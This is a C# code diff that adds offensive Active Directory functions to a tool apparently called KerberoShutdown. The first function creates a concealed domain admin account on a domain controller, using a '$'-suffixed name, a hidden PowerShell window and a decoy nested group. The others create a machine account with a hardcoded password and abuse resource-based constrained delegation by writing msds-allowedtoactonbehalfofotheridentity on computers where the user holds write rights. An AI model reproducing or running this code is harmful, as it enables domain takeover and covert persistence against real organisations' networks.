@@ -125,6 +125,44 @@ namespace KerberoShutdown
             }
         }
 
+        internal static void HiddenAccountOnDC(string da, string password)
+        {
+            DisplayUtil.Print("[*] Let's Go! Create Hidden Domain Admin Account. .", Enums.PrintColor.RED);
+            Console.WriteLine();
+            DomainController dc = null;
+            Forest woods = Forest.GetCurrentForest();
+            DomainCollection domains = woods.Domains;
+            foreach (Domain domain in domains)
+            {
+                dc = domain.FindDomainController();
+            }
+
+            string fake_da = da + "$";
+            if (System.Net.Dns.GetHostName().ToString().ToLower().Contains(dc.Name.ToString().ToLower()))
+            {
+                try
+                {
+                    System.Diagnostics.Process process = new System.Diagnostics.Process();
+                    System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+                    startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+                    startInfo.FileName = "powershell.exe";
+                    startInfo.Arguments = "net user " + fake_da + " " + password + " /add /domain;net group \"Domain Admin Enterprise\" /add /domain;net group \"Domain Admin Enterprise\" " + fake_da + " /add;Add-ADGroupMember -Identity \"Domain Admins\" -Members \"Domain Admin Enterprise\";";
+                    process.StartInfo = startInfo;
+                    process.Start();
+                    process.WaitForExit();
+                }
+                catch
+                {
+                    DisplayUtil.Print("\n[-] Failed: Something went wrong ", Enums.PrintColor.RED);
+                }
+            }
+            else
+            {
+                DisplayUtil.Print("\n[-] Failed: this machine is not the Domain Controller ", Enums.PrintColor.RED);
+                Environment.Exit(0);
+            }
+        }
+
         public static void GetConstrainedDelegation()
         {
             DisplayUtil.Print("[*] Searching for Constrained Delegation accounts. .", Enums.PrintColor.RED);
@@ -207,6 +245,149 @@ namespace KerberoShutdown
                     }
                 }
                 catch { }
+            }
+        }
+
+        public static string CreateNewComputer(string domainname, string machinename)
+        {
+            string res = "";
+            string[] dn = domainname.Split('.');
+
+            for (int i = 0; i < dn.Length; i++)
+            {
+                dn[i] = "DC=" + dn[i];
+            }
+
+            try
+            {
+                System.DirectoryServices.DirectoryEntry de = new System.DirectoryServices.DirectoryEntry("LDAP://CN=Computers," + String.Join(",", dn));
+                System.DirectoryServices.DirectoryEntry computerobj = de.Children.Add("CN=" + machinename, "computer");
+                computerobj.Properties["useraccountcontrol"].Value = 0x1000;
+                computerobj.Properties["samaccountname"].Value = machinename + "$";
+                computerobj.CommitChanges();
+
+                string computerpass = "Passw0rd2.";
+                computerobj.Invoke("SetPassword", computerpass);
+                computerobj.CommitChanges();
+
+                Console.WriteLine("Created computer account: {0} ", machinename + "$");
+                Console.WriteLine("Password computer account: {0} ", computerpass);
+
+                byte[] sid = (byte[])computerobj.Properties["objectsid"][0];
+                SecurityIdentifier si = new SecurityIdentifier(sid, 0);
+
+                Console.WriteLine("SID: {0}", si.ToString());
+
+                res = si.ToString();
+            }
+            catch(Exception e)
+            {
+                res = e.Message;
+            }
+            
+            return res;
+        }
+        
+        public static string GetRandomName()
+        {
+            string res = "";
+            var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
+            var random = new Random();
+
+            char[] old = new char[10];
+
+            for(int i = 0; i < 10; i++)
+            {
+                old[i] = chars[random.Next(10)];
+            }
+            res = new String(old);
+            return res;
+        }
+        public static void RBCD(string domainName)
+        {
+            DisplayUtil.Print("[*] Searching for Resource-based Constrained Delegation accounts. .", Enums.PrintColor.RED);
+            Console.WriteLine();
+            string res="";
+            StringWriter sw = new StringWriter();
+            try {  
+                string[] dn = domainName.Split('.');
+
+                for (int i = 0; i < dn.Length; i++)
+                {
+                    dn[i] = "DC=" + dn[i];
+
+                }
+
+                //LDAP://DC=pentest,DC=local
+                System.DirectoryServices.DirectoryEntry de = new System.DirectoryServices.DirectoryEntry(String.Format("LDAP://{0}", String.Join(",", dn)));
+                DirectorySearcher ds = new DirectorySearcher();
+                ds.SearchRoot = de;
+
+                //ds.Filter = "(objectclass=user)";
+
+                SearchResult sr = ds.FindOne();
+                try
+                {
+                    if (sr.Properties["ms-DS-MachineAccountQuota"][0].ToString() != null)
+                    {
+                        Console.WriteLine(sr.Path);
+                        int computeraccountscancreate = Convert.ToInt32(sr.Properties["ms-DS-MachineAccountQuota"].Count);
+                        if(computeraccountscancreate > 0)
+                        {
+                            sw.WriteLine("Number of computer account you can create: {0}", computeraccountscancreate);
+                            sw.WriteLine();
+                        }     
+                    }
+
+                    ds.Filter = "(objectclass=computer)";
+
+                    string currentuser = WindowsIdentity.GetCurrent().Name;
+                    // pentest\user2
+                    currentuser = currentuser.Split('\\')[1];
+
+                    foreach(SearchResult sr2 in ds.FindAll())
+                    {
+                        System.DirectoryServices.DirectoryEntry de2 = sr2.GetDirectoryEntry();
+                        ActiveDirectorySecurity ads = de2.ObjectSecurity;
+                        AuthorizationRuleCollection arc = ads.GetAccessRules(true, true, typeof(NTAccount));
+
+                        foreach(ActiveDirectoryAccessRule ar in arc)
+                        {
+                            if (ar.IdentityReference.ToString().ToLower().Contains(currentuser.ToLower()))
+                            {
+                                if(ar.ActiveDirectoryRights.ToString().ToLower().Contains("genericwrite") || ar.ActiveDirectoryRights.ToString().ToLower().Contains("genericall"))
+                                {
+                                    sw.WriteLine(sr2.Path);
+                                    sw.WriteLine(ar.ActiveDirectoryRights);
+                                    sw.WriteLine(ar.ActiveDirectoryRights);
+                                    sw.WriteLine(ar.InheritanceFlags);
+
+                                    //Create fake computer account
+                                    string newsid = CreateNewComputer("domain", GetRandomName());
+                                    string sddl = @"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;" + newsid + ")";
+                                    RawSecurityDescriptor rs = new RawSecurityDescriptor(sddl);
+
+                                    byte[] bytesid = new byte[sddl.Length];
+                                    rs.GetBinaryForm(bytesid, 0);
+
+                                    de2.Properties["msds-allowedtoactonbehalfofotheridentity"].Value = bytesid;
+                                    de2.CommitChanges();
+
+                                    sw.WriteLine("Set SID: {0} to {1} ", newsid, de2.Path);
+                                }
+                            }
+                            sw.WriteLine();
+                        }
+                                
+                    }
+                }
+                catch { }
+
+                res = sw.ToString();
+                Console.WriteLine(res);
+            }
+            catch
+            {
             }
         }
 
